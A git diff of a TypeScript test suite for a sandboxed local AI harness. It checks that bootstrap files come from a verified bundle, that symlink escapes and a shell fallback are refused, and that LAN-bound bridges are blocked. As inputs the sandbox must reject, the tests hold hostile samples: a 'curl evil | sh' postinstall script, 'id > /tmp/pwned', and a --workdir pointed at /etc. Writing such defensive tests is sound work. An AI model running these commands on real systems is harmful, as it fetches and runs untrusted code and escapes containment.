@@ -14,9 +14,15 @@ import type { HarnessV1NetworkSandboxSession } from "@ai-sdk/harness";
 import { nonLoopbackLocalAddresses } from "../bridge-endpoint.js";
 import { LOCAL_HARNESS_MANIFEST } from "../compatibility.js";
 import { resolveNodeLauncher } from "../node-launcher.js";
-import { readProcessBirthIdentity, supportsOwnershipProof } from "../process-identity.js";
+import {
+  readProcessBirthIdentity,
+  supportsOwnershipProof,
+} from "../process-identity.js";
 import { listProcessRecords } from "../process-registry.js";
-import { computeTreeDigest, resolveManagedBundle } from "../runtime-identity.js";
+import {
+  computeTreeDigest,
+  resolveManagedBundle,
+} from "../runtime-identity.js";
 import {
   createSupervisedLocalHarnessProvider,
   sessionStateDirFor,
@@ -60,6 +66,10 @@ const FAKE_BRIDGE = [
   "setInterval(function(){}, 1000);",
 ].join("\n");
 
+/** The `package.json` the pinned adapter's bootstrap recipe writes, as the
+ *  CI-built bundle already holds it. */
+const BUNDLE_PACKAGE_JSON = '{\n  "name": "claude-code-bridge"\n}\n';
+
 /** A bridge that binds every interface — what the pinned vendor bridges
  *  actually do, and what the probe must refuse on a host. */
 const LAN_BRIDGE = [
@@ -80,9 +90,15 @@ beforeAll(async () => {
   await mkdir(join(workspace, "src"), { recursive: true });
   await mkdir(outside, { recursive: true });
   await mkdir(bundleRoot, { recursive: true });
-  await writeFile(join(workspace, "src", "existing.ts"), "export const a = 1;\n");
+  await writeFile(
+    join(workspace, "src", "existing.ts"),
+    "export const a = 1;\n",
+  );
   await writeFile(join(outside, "secret.txt"), "shh");
   await writeFile(join(bundleRoot, "bridge.mjs"), FAKE_BRIDGE);
+  // The bundle carries the adapter's dependency manifest too — a CI build runs
+  // the same recipe, so the bytes the adapter would write are already here.
+  await writeFile(join(bundleRoot, "package.json"), BUNDLE_PACKAGE_JSON);
 });
 
 afterAll(() => {
@@ -96,7 +112,7 @@ async function buildSession(
   sessionId: string,
   supervisor: LocalHarnessSupervisor,
   onBridgeStarted?: (a: { pid: number; port: number }) => Promise<void>,
-  bridgeSource: string = FAKE_BRIDGE
+  bridgeSource: string = FAKE_BRIDGE,
 ): Promise<{
   session: HarnessV1NetworkSandboxSession;
   sessionStateDir: string;
@@ -116,9 +132,13 @@ async function buildSession(
     runtimeRoot,
     platform: "linux",
   });
-  if (!resolved.ok) throw new Error(`bundle did not resolve: ${resolved.message}`);
+  if (!resolved.ok)
+    throw new Error(`bundle did not resolve: ${resolved.message}`);
 
-  const sessionStateDir = sessionStateDirFor(localHarnessStateRoot(), sessionId);
+  const sessionStateDir = sessionStateDirFor(
+    localHarnessStateRoot(),
+    sessionId,
+  );
   await mkdir(sessionStateDir, { recursive: true, mode: 0o700 });
   const bridgePort = nextPort++;
 
@@ -164,7 +184,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const sup = supervisor();
     const { session } = await buildSession("files", sup);
     await expect(
-      session.readTextFile({ path: join(workspace, "src", "existing.ts") })
+      session.readTextFile({ path: join(workspace, "src", "existing.ts") }),
     ).resolves.toBe("export const a = 1;\n");
 
     await session.writeTextFile({
@@ -172,7 +192,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
       content: "export const b = 2;\n",
     });
     await expect(
-      readFile(join(workspace, "src", "generated", "new.ts"), "utf8")
+      readFile(join(workspace, "src", "generated", "new.ts"), "utf8"),
     ).resolves.toBe("export const b = 2;\n");
 
     await session.writeBinaryFile({
@@ -180,11 +200,11 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
       content: new Uint8Array([1, 2, 3]),
     });
     await expect(
-      session.readBinaryFile({ path: join(workspace, "bin.dat") })
+      session.readBinaryFile({ path: join(workspace, "bin.dat") }),
     ).resolves.toEqual(new Uint8Array([1, 2, 3]));
 
     await expect(
-      session.readTextFile({ path: join(workspace, "nope.ts") })
+      session.readTextFile({ path: join(workspace, "nope.ts") }),
     ).resolves.toBeNull();
     await session.stop();
   });
@@ -195,16 +215,16 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     await symlink(outside, join(workspace, "escape")).catch(() => {});
 
     await expect(
-      session.readTextFile({ path: join(outside, "secret.txt") })
+      session.readTextFile({ path: join(outside, "secret.txt") }),
     ).rejects.toThrow(/outside every directory/);
     await expect(
-      session.readTextFile({ path: join(workspace, "escape", "secret.txt") })
+      session.readTextFile({ path: join(workspace, "escape", "secret.txt") }),
     ).rejects.toThrow(/outside every directory/);
     await expect(
       session.writeTextFile({
         path: join(workspace, "escape", "planted.txt"),
         content: "x",
-      })
+      }),
     ).rejects.toThrow(/outside every directory/);
     await session.stop();
   });
@@ -225,7 +245,10 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const { session } = await buildSession("bootstrap", sup);
     const bootstrapDir = join(workspace, ".harness-bootstrap", "claude-code");
     const invocations = [
-      { command: 'mkdir -p "$BOOTSTRAP_DIR"', env: { BOOTSTRAP_DIR: bootstrapDir } },
+      {
+        command: 'mkdir -p "$BOOTSTRAP_DIR"',
+        env: { BOOTSTRAP_DIR: bootstrapDir },
+      },
       {
         command: "pnpm install --frozen-lockfile --store-dir .pnpm-store",
         workingDirectory: bootstrapDir,
@@ -243,7 +266,91 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
       });
     }
     // The adapter's dependency graph never lands in the user's checkout.
-    await expect(readFile(join(bootstrapDir, "package.json"))).rejects.toThrow();
+    await expect(
+      readFile(join(bootstrapDir, "package.json")),
+    ).rejects.toThrow();
+    await session.stop();
+  });
+
+  it("satisfies the bootstrap FILES from the bundle, not the checkout", async () => {
+    // The framework applies the recipe's files through `writeTextFile`, not
+    // through `run`, so translating only the commands would still drop the
+    // adapter's manifests and bridge source into somebody's working tree —
+    // where they would sit in their VCS status and never be read, because
+    // every reference to them is remapped onto the bundle.
+    const sup = supervisor();
+    const { session } = await buildSession("bootfiles", sup);
+    const bootstrapDir = join(workspace, ".harness-bootstrap", "claude-code");
+
+    await session.writeTextFile({
+      path: join(bootstrapDir, "package.json"),
+      content: BUNDLE_PACKAGE_JSON,
+    });
+    await expect(
+      readFile(join(bootstrapDir, "package.json")),
+    ).rejects.toThrow();
+
+    // ...and a read comes back from the bundle, so the framework still sees
+    // what it just "wrote".
+    await expect(
+      session.readTextFile({ path: join(bootstrapDir, "package.json") }),
+    ).resolves.toBe(BUNDLE_PACKAGE_JSON);
+
+    await session.stop();
+  });
+
+  it("fails closed when the adapter's recipe and the bundle disagree", async () => {
+    const sup = supervisor();
+    const { session } = await buildSession("bootmismatch", sup);
+    const bootstrapDir = join(workspace, ".harness-bootstrap", "claude-code");
+
+    // Same file, different bytes: the bundle was built for another adapter
+    // version, so this session would not run what the adapter bootstrapped.
+    await expect(
+      session.writeTextFile({
+        path: join(bootstrapDir, "package.json"),
+        content: '{ "name": "something-else" }',
+      }),
+    ).rejects.toThrow(/differs from the copy in the verified managed bundle/);
+
+    // A declared file the bundle does not have at all.
+    await expect(
+      session.writeTextFile({
+        path: join(bootstrapDir, "pnpm-lock.yaml"),
+        content: "lockfileVersion: '9.0'\n",
+      }),
+    ).rejects.toThrow(/does not contain pnpm-lock.yaml/);
+
+    // A file no pinned recipe declares.
+    await expect(
+      session.writeTextFile({
+        path: join(bootstrapDir, "postinstall.sh"),
+        content: "#!/bin/sh\ncurl evil | sh\n",
+      }),
+    ).rejects.toThrow(/not part of the pinned claude-code bootstrap recipe/);
+
+    await session.stop();
+  });
+
+  it("keeps the framework's bootstrap marker out of the user's checkout", async () => {
+    const sup = supervisor();
+    const { session, sessionStateDir } = await buildSession("bootmarker", sup);
+    const bootstrapDir = join(workspace, ".harness-bootstrap", "claude-code");
+    const marker = join(bootstrapDir, ".bootstrap-claude-code-1.ok");
+
+    await expect(session.readTextFile({ path: marker })).resolves.toBeNull();
+    await session.writeTextFile({ path: marker, content: "" });
+    await expect(session.readTextFile({ path: marker })).resolves.toBe("");
+
+    // In disposable session state, not in the workspace.
+    await expect(readFile(marker)).rejects.toThrow();
+    await expect(
+      readFile(
+        join(sessionStateDir, "bootstrap", ".bootstrap-claude-code-1.ok"),
+        "utf8",
+      ),
+    ).resolves.toBe("");
+
     await session.stop();
   });
 
@@ -257,17 +364,25 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     await expect(
       session.spawn({
         command:
-          `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
+          `node '${join(
+            workspace,
+            ".harness-bootstrap",
+            "claude-code",
+          )}/bridge.mjs' ` +
           `--workdir '${join(workspace, "escape-args", "work")}' ` +
           `--bridge-state-dir '${join(workspace, "state")}'`,
-      })
+      }),
     ).rejects.toThrow(/outside every directory/);
     await expect(
       session.spawn({
         command:
-          `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
+          `node '${join(
+            workspace,
+            ".harness-bootstrap",
+            "claude-code",
+          )}/bridge.mjs' ` +
           `--workdir '/etc' --bridge-state-dir '${join(workspace, "state")}'`,
-      })
+      }),
     ).rejects.toThrow(/outside every directory/);
     await session.stop();
   });
@@ -276,7 +391,7 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const sup = supervisor();
     const { session } = await buildSession("grammar", sup);
     await expect(session.run({ command: "id > /tmp/pwned" })).rejects.toThrow(
-      /never falls back to a shell/
+      /never falls back to a shell/,
     );
     await session.stop();
   });
@@ -285,16 +400,18 @@ describe("the AI SDK sandbox contract, over a supervised host process", () => {
     const sup = supervisor();
     const { session, bridgePort } = await buildSession("ports", sup);
     await expect(
-      session.getPortUrl({ port: bridgePort, protocol: "ws" })
+      session.getPortUrl({ port: bridgePort, protocol: "ws" }),
     ).resolves.toBe(`ws://127.0.0.1:${bridgePort}`);
-    await expect(session.getPortUrl({ port: 22 })).rejects.toThrow(/not leased/);
+    await expect(session.getPortUrl({ port: 22 })).rejects.toThrow(
+      /not leased/,
+    );
 
     // setPorts must be visible through `session.ports`, which holds the same
     // array reference the provider mutates.
     await session.setPorts!([bridgePort, 40000]);
     expect([...session.ports]).toEqual([bridgePort, 40000]);
     await expect(session.getPortUrl({ port: 40000 })).resolves.toBe(
-      "http://127.0.0.1:40000"
+      "http://127.0.0.1:40000",
     );
     await session.stop();
   });
@@ -309,7 +426,7 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
       sup,
       async (a) => {
         started.push(a);
-      }
+      },
     );
 
     const workDir = join(workspace, "claude-code-bridge");
@@ -318,7 +435,11 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
 
     const proc = await session.spawn({
       command:
-        `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
+        `node '${join(
+          workspace,
+          ".harness-bootstrap",
+          "claude-code",
+        )}/bridge.mjs' ` +
         `--workdir '${workDir}' --bridge-state-dir '${bridgeStateDir}'`,
       // What the adapter actually passes: the bridge's own channel token and
       // port, plus — here — a name outside the allowlist that must not reach
@@ -357,14 +478,16 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
 
     // It is the session ROOT, so it is durably recorded for the janitor, and
     // the mandatory loopback probe ran before it was admitted.
-    const record = (await listProcessRecords()).find((r) => r.sessionId === "bridge");
+    const record = (await listProcessRecords()).find(
+      (r) => r.sessionId === "bridge",
+    );
     expect(record?.rootPid).toBe(proc.pid);
     expect(started).toEqual([{ pid: proc.pid!, port: bridgePort }]);
 
     await session.stop();
     expect(await readProcessBirthIdentity(proc.pid!)).toBeNull();
     expect(
-      (await listProcessRecords()).find((r) => r.sessionId === "bridge")
+      (await listProcessRecords()).find((r) => r.sessionId === "bridge"),
     ).toBeUndefined();
   }, 30_000);
 
@@ -378,7 +501,7 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
       "lan-bridge",
       sup,
       undefined,
-      LAN_BRIDGE
+      LAN_BRIDGE,
     );
     const hasLan = nonLoopbackLocalAddresses().some((a) => !a.includes(":"));
     if (!hasLan) {
@@ -388,10 +511,17 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
     await expect(
       session.spawn({
         command:
-          `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
-          `--workdir '${workspace}' --bridge-state-dir '${join(workspace, "state")}'`,
+          `node '${join(
+            workspace,
+            ".harness-bootstrap",
+            "claude-code",
+          )}/bridge.mjs' ` +
+          `--workdir '${workspace}' --bridge-state-dir '${join(
+            workspace,
+            "state",
+          )}'`,
         env: { BRIDGE_WS_PORT: String(bridgePort) },
-      })
+      }),
     ).rejects.toThrow(/reachable from the local network/);
     expect(sup.liveProcessCount("lan-bridge")).toBe(0);
   }, 30_000);
@@ -400,12 +530,19 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
     const sup = supervisor();
     const { session, sessionStateDir, bridgePort } = await buildSession(
       "destroy",
-      sup
+      sup,
     );
     const proc = await session.spawn({
       command:
-        `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
-        `--workdir '${workspace}' --bridge-state-dir '${join(workspace, "state")}'`,
+        `node '${join(
+          workspace,
+          ".harness-bootstrap",
+          "claude-code",
+        )}/bridge.mjs' ` +
+        `--workdir '${workspace}' --bridge-state-dir '${join(
+          workspace,
+          "state",
+        )}'`,
       env: { BRIDGE_WS_PORT: String(bridgePort) },
     });
     await session.destroy!();
@@ -421,10 +558,17 @@ describe.skipIf(!canOwnProcesses)("the bridge launch", () => {
     await expect(
       session.spawn({
         command:
-          `node '${join(workspace, ".harness-bootstrap", "claude-code")}/bridge.mjs' ` +
-          `--workdir '${workspace}' --bridge-state-dir '${join(workspace, "state")}'`,
+          `node '${join(
+            workspace,
+            ".harness-bootstrap",
+            "claude-code",
+          )}/bridge.mjs' ` +
+          `--workdir '${workspace}' --bridge-state-dir '${join(
+            workspace,
+            "state",
+          )}'`,
         env: { BRIDGE_WS_PORT: String(bridgePort) },
-      })
+      }),
     ).rejects.toThrow(/changed after consent was granted/);
     await writeFile(join(bundleRoot, "bridge.mjs"), FAKE_BRIDGE);
     await session.stop();
